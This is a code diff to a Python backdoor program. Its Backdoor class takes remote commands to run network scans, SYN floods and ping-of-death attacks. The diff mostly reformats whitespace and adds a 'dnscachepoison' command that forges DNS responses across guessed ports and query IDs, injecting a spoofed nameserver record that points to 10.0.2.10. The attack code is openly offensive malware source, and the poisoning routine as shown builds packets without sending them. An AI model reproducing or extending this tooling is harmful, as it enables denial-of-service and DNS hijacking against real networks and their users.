@@ -6,6 +6,7 @@ import json
 import os
 import base64
 import sys
+from functools import partial
 from time import sleep
 import multiprocessing
 from ctypes import c_bool
@@ -13,7 +14,6 @@ import scapy.all as scapy
 import re
 import netfilterqueue
 import random
-
 
 user_agent_list = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
@@ -23,6 +23,7 @@ user_agent_list = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'
 ]
 garbage = ['c', 'u', 'e', 'n', 'i', 'v', 'd', 'r', '6', 's', '2', 't', '1', 'y', '7']
+
 
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
@@ -59,7 +60,7 @@ def network_scanner():
     route = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(scapy.conf.route))
     network, i = "0.0.0.0", 0
     while network == "0.0.0.0":
-        network, netmask, machine_ip = route[4+i*4], route[5+i*4], route[7+i*4]
+        network, netmask, machine_ip = route[4 + i * 4], route[5 + i * 4], route[7 + i * 4]
         i += 1
     if network and netmask:
         print('Network: {}'.format(network))
@@ -258,6 +259,7 @@ def randomize_ip():
     random_ip = iprange[0] + '.' + iprange[1] + '.' + iprange[2] + '.' + str(random.randrange(2, 254))
     return random_ip
 
+
 def randomize_integer():
     random_int = random.randrange(1, 1024)
     return random_int
@@ -276,7 +278,7 @@ def syn_flooding(port):
         tcp_packet.seq = randomize_integer()
         tcp_packet.window = randomize_integer()
         try:
-            scapy.send(ip_packet/tcp_packet, verbose=False)
+            scapy.send(ip_packet / tcp_packet, verbose=False)
         except:
             pass
 
@@ -304,9 +306,26 @@ def ping_of_death(flood_ip, times):
 
     for _ in range(times):
         try:
-            scapy.send(ip_packet/icmp_packet/payload, verbose=False)
+            scapy.send(ip_packet / icmp_packet / payload, verbose=False)
         except:
             pass
+
+
+def create_dns_response(dns_qid, qdsec, ansec, nssec, ip, udp):
+    dns = scapy.DNS(id=dns_qid, qr=1, aa=1, rcode=0, qdcount=1, ancount=1, nscount=1,
+                    arcount=0, qd=qdsec, an=ansec, ns=nssec, ar=None)
+    response = scapy.raw(ip / udp / dns)
+    return response
+
+
+def fake_dns_responses(dns_port, dnsqids, qdsec, ansec, nssec, ip, total_responses):
+    udp = scapy.UDP(sport=53, dport=dns_port)
+    p = multiprocessing.Pool(8)
+    port_responses = p.map(partial(create_dns_response, qdsec=qdsec, ansec=ansec, nssec=nssec, ip=ip, udp=udp), dnsqids)
+    p.close()
+    p.join()
+    total_responses.append(port_responses)
+
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -443,6 +462,35 @@ class Backdoor:
                             ping_of_death(flood_ip, flood_time)
                         except:
                             pass
+                    elif command[0] == "dnscachepoison":
+                        # try:
+                        spoofDomain = command[1]
+                        ns = command[2]
+                        nsAddr = command[3]
+                        dnsAddr = command[4]
+                        dnsPorts = list(map(int, command[5].translate({ord(i): None for i in '[]'}).split(',')))
+                        dnsQids = list(map(int, command[6].translate({ord(i): None for i in '[]'}).split(',')))
+                        query = command[7]
+                        badAddr = "10.0.2.10"
+
+                        ip = scapy.IP(src=nsAddr, dst=dnsAddr)
+                        qdsec = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
+                        ansec = scapy.DNSRR(rrname=ns, type="A", rclass="IN", ttl=60000, rdata=badAddr)
+                        nssec = scapy.DNSRR(rrname=spoofDomain, type="NS", rclass="IN", ttl=60000, rdata=ns)
+
+                        p_processes = []
+                        manager = multiprocessing.Manager()
+                        total_responses = manager.list()
+                        for port in dnsPorts:
+                            p = multiprocessing.Process(target=fake_dns_responses,
+                                                        args=(port, dnsQids, qdsec, ansec, nssec, ip, total_responses))
+                            p.start()
+                            p_processes.append(p)
+                        for process in p_processes:
+                            process.join()
+                        final_responses = [response for sublist in total_responses for response in sublist]
+                        # except:
+                        #     pass
                     elif command[0] == "killarp":
                         try:
                             kill_arp()
